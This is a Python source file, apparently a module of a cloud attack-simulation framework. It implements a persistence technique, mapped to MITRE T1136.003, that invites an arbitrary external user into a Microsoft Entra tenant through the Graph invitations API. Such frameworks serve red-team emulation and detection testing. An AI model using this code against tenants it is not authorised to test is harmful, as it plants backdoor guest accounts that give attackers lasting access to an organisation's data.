from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraInviteExternalUser(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1136.003",
                technique_name="Create Account",
                tactics=["Persistence"],
                sub_technique_name="Cloud Account"
            )
        ]
        super().__init__("Invite External User", "Invites any external user to grant access to the current tenant allowing persistence", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            external_user_email: str = kwargs.get('external_user_email', None)
            invitation_message: str = kwargs.get('invitation_message', None)
            
            if external_user_email in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }
            
            if invitation_message in [None, ""]:
                invitation_message = "Welcome to the organization! Visit the link to accept the invitation."


            endpoint_url = f"https://graph.microsoft.com/v1.0/invitations"
            
            # Create request payload
            data = {
                "invitedUserEmailAddress": f"{external_user_email}",
                "inviteRedirectUrl": "https://myapp.contoso.com",
                'sendInvitationMessage': True,
                'invitedUserMessageInfo': {
                    'customizedMessageBody': invitation_message
                }
            }
            
            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Request successfull
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully invited external user-{external_user_email} to tenant",
                    "value": {
                        'External User' : raw_response.json().get('invitedUserEmailAddress', 'N/A'),
                        'invited_user_type' : raw_response.json().get('invitedUserType', 'N/A'),
                        'invited_user_id' : raw_response.json().get('invitedUser', 'N/A').get('id', 'N/A'),
                        'invitation_message' : raw_response.json().get('invitedUserMessageInfo', 'N/A').get('customizedMessageBody', 'N/A'),
                        'invite_redeem_url' : raw_response.json().get('inviteRedeemUrl', 'N/A'),
                        'invite_status' : raw_response.json().get('status', 'N/A'),
                    }
                }
            
            # Request failed
            else:
                return ExecutionStatus.FAILURE, {
                    "error": {"error_code" : raw_response.json().get('error').get('code', 'N/A'), 
                              "error_message" :raw_response.json().get('error').get('message', 'N/A')
                              },
                    "message": "Failed to invited external user to tenant"
                }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to invited external user to tenant"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "external_user_email": {"type": "str", "required": True, "default":None, "name": "External User Email", "input_field_type" : "email"},
            "invitation_message": {"type": "str", "required": True, "default":None, "name": "Invitation Message", "input_field_type" : "text"}
        }